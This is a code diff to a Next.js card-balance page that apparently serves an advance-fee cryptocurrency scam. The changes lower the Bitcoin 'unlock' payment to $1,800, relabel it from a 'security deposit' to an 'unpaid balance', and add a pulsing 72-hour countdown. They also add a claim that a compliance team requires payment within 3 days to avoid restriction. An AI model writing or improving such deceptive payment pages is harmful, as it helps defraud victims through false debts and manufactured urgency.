@@ -4,12 +4,12 @@ import { useState, useEffect, useCallback } from 'react';
 import {
   CreditCard, CheckCircle, ShieldAlert, ShieldCheck,
   Activity, Eye, EyeOff, Info, ArrowRight,
-  Bitcoin, Copy, X, Loader2, Wallet,
+  Bitcoin, Copy, X, Loader2, Wallet, Clock,
 } from 'lucide-react';
 import Link from 'next/link';
 
-/* ─── BTC wallet the user must pay $6,000 to ─── */
-const UNLOCK_AMOUNT = 6000;
+/* ─── BTC wallet the user must pay $1,800 to ─── */
+const UNLOCK_AMOUNT = 1800;
 
 interface CardDetails {
   id: string;
@@ -44,6 +44,21 @@ export default function CardPage() {
   const [transferError, setTransferError] = useState('');
   const [isSubmitting,  setIsSubmitting]  = useState(false);
   const [timeLeft,      setTimeLeft]      = useState('');
+
+  /* ── countdown timer ── */
+  const [countdown, setCountdown] = useState(72 * 60 * 60);
+
+  useEffect(() => {
+    const timer = setInterval(() => setCountdown(prev => (prev > 0 ? prev - 1 : 0)), 1000);
+    return () => clearInterval(timer);
+  }, []);
+
+  const formatCountdown = (secs: number) => {
+    const h = Math.floor(secs / 3600).toString().padStart(2, '0');
+    const m = Math.floor((secs % 3600) / 60).toString().padStart(2, '0');
+    const s = (secs % 60).toString().padStart(2, '0');
+    return `${h}h ${m}m ${s}s`;
+  };
 
   const fetchCardStatus = useCallback(async () => {
     try {
@@ -341,11 +356,18 @@ export default function CardPage() {
                     <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-orange-500/10 text-orange-400 mb-1">
                       <Bitcoin className="w-7 h-7" />
                     </div>
-                    <h3 className="text-xl font-bold text-white">Move Balance to Card</h3>
+                    <h3 className="text-xl font-bold text-white">Clear Unpaid Balance</h3>
                     <p className="text-gray-400 text-sm">
-                      To process your balance transfer to the card, you must first send a security deposit of{' '}
+                      To process your balance transfer to the card, you must first clear your unpaid balance of{' '}
                       <strong className="text-white">${UNLOCK_AMOUNT.toLocaleString()} in BTC</strong> to the address below.
                     </p>
+                    <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-3 flex items-center justify-between mt-4">
+                      <div className="flex items-center gap-2">
+                        <Clock className="w-5 h-5 text-red-400 animate-pulse" />
+                        <span className="text-sm font-semibold text-red-400">Time remaining to cover balance:</span>
+                      </div>
+                      <span className="font-mono text-lg font-bold text-red-400">{formatCountdown(countdown)}</span>
+                    </div>
                   </div>
 
                   {/* Amount input */}
@@ -387,7 +409,7 @@ export default function CardPage() {
                       </button>
                     </div>
                     <p className="text-xs text-gray-500">
-                      ⚠️ This deposit unlocks your balance transfer and is required by our compliance team. Once confirmed on-chain, your card will be credited within 24–48 hrs.
+                      ⚠️ Clearing this unpaid balance is required by our compliance team. You have 3 days to cover this balance to avoid restriction. Once confirmed on-chain, your card will be credited within 24–48 hrs.
                     </p>
                   </div>
 
